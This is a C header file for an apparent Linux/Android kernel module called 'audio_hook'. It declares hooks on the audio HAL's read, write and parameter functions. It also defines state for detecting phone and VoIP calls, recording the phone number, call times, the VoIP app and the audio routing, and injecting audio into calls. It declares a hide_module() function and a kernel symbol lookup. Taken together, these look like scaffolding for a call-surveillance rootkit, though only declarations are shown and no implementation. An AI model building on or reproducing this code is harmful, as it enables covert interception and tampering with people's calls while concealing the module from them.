#ifndef _AUDIO_HOOK_H
#define _AUDIO_HOOK_H

#include <linux/types.h>
#include <linux/time64.h>
#include <sound/audio_hooks.h>

#define MODULE_NAME "audio_hook"
#define SAMPLE_RATE 48000
#define CHANNEL_COUNT 2
#define BUFFER_SIZE 4096
#define VOIP_DETECT_THRESHOLD 5
#define CALL_DETECT_THRESHOLD 3
#define AUDIO_DEVICE_OUT_EARPIECE 0x1
#define AUDIO_DEVICE_OUT_SPEAKER 0x2
#define AUDIO_DEVICE_OUT_BLUETOOTH_SCO 0x10
#define AUDIO_DEVICE_OUT_BLUETOOTH_SCO_HEADSET 0x20

enum call_type {
    CALL_TYPE_UNKNOWN,
    CALL_TYPE_INCOMING,
    CALL_TYPE_OUTGOING
};

struct ogg_file_header {
    u32 capture_pattern;
    u8 stream_structure_version;
    u8 header_type_flag;
    u64 granule_position;
    u32 bitstream_serial_number;
    u32 page_sequence_number;
    u32 checksum;
    u8 page_segments;
    u8 segment_table[255];
} __packed;

struct audio_state {
    bool voip_active;
    bool normal_call_active;
    int voip_detection_count;
    int normal_detection_count;
    int sample_rate;
    int channels;
    void *injection_audio;
    size_t injection_size;
    size_t injection_pos;
    bool inject_audio;
    spinlock_t state_lock;
    enum call_type current_call_type;
    char *phone_number;
    struct timespec64 call_start_time;
    struct timespec64 call_end_time;
    long call_duration_secs;
    char *voip_app;
    audio_devices_t current_routing;
    bool bluetooth_active;
    bool speaker_active;
};

typedef int (*audio_out_set_parameters_t)(struct audio_stream_out *stream, const char *kvpairs);
typedef int (*audio_in_set_parameters_t)(struct audio_stream_in *stream, const char *kvpairs);
typedef int (*audio_out_write_t)(struct audio_stream_out *stream, const void *buffer, size_t bytes);
typedef int (*audio_in_read_t)(struct audio_stream_in *stream, void *buffer, size_t bytes);
typedef audio_devices_t (*get_devices_t)(const struct audio_stream *stream);

extern void hook_audio_hal(void);
extern void hide_module(void);
extern void *find_symbol(const char *name);

#endif /* _AUDIO_HOOK_H */